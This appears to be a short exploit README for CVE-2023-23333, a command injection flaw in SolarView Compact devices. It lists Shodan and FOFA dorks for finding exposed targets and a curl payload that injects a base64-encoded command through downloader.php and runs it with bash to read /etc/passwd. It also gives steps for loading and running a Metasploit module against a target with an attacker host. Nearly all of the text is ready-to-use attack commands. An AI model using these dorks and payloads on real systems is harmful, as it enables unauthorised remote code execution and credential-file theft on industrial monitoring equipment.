# CVE-2023-23333

![](https://img.shields.io/static/v1?label=Product&message=SolarView%20Compact&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=%3C%3Dver%206.00&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Command%20Injection&color=red)


- Shodan dork:
```
http.html:"SolarView Compact"
```
- FOFA dork:
```
body="SolarView Compact"
```
### Curl PoC
```
echo -n 'cat /etc/passwd' | base64

Y2F0IC9ldGMvcGFzc3dkCg
```
```
curl http://target.com/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base64%20-d|bash%00.zip | grep root:.*:0:0
```

### Metasploit-Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/SolarView_Compact/solarview_compact.rb
```
```
cp solarview_compact.rb /usr/share/matasploit-framework/modules/exploits/linux/http/solarview_unauth_rce_cve_2023_23333.rb
```
```
msfdb reinit; msfconsole -q
```
```
use exploit/linux/http/solarview_unauth_rce_cve_2023_23333.rb
```
```
set rhost target_ip
```
```
set lhost attacker_ip
```
```
run
```
